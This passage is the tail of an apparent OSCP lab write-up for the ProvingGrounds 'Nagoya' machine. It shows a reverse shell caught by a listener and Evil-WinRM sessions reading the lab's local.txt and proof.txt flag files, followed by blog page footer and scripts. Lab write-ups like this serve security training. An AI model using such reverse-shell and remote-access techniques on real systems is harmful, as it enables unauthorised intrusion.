</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.193<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.166.21<span class="o">]</span> <span class="m">50271</span>
</span></span><span class="line"><span class="cl">Windows PowerShell 
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nagoya-ind<span class="se">\n</span>agoya$
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\p</span>roof.txt
</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\p</span>roof.txt
</span></span><span class="line"><span class="cl">fa2dba2c7bdff500c6f6ce31dfa6037e</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="flag" class="heading-element"><span>Flag</span>
  <a href="#flag" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hristopher.Lewis&gt; <span class="nb">type</span> C:<span class="se">\l</span>ocal.txt
</span></span><span class="line"><span class="cl">81950a6ba1771f388080cb994a7fcb33
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\p</span>roof.txt
</span></span><span class="line"><span class="cl">fa2dba2c7bdff500c6f6ce31dfa6037e</span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2024-02-07 15:09:17">更新于 2024-02-07&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/provinggrounds-heist/" class="post-nav-item" rel="prev" title="ProvingGrounds Heist Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds Heist Writeup</a><a href="/posts/provinggrounds-vault/" class="post-nav-item" rel="next" title="ProvingGrounds Vault Writeup">ProvingGrounds Vault Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus" class="comment">
          <script
            src="https://giscus.app/client.js"
            data-repo="XavierRoot/XavierBlog"
            data-repo-id="R_kgDOHswyxg"
            data-category="Announcements"
            data-category-id="DIC_kwDOHswyxs4Cd2zm"
            data-mapping="title"
            data-strict="0"
            
            data-theme="preferred_color_scheme"
            data-reactions-enabled="1"
            data-emit-metadata="0"
            data-input-position="bottom"
            data-lang="en"
            data-loading="lazy"
            crossorigin="anonymous"
            async
            defer
          ></script>
        </div>
        <noscript>
          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
        </noscript></div></article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        processEscapes: true
      }
    });
</script>

<script src='https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML' async></script>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light","origin":"https://giscus.app"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};</script><script src="/js/theme.min.js" defer></script></body>
</html>
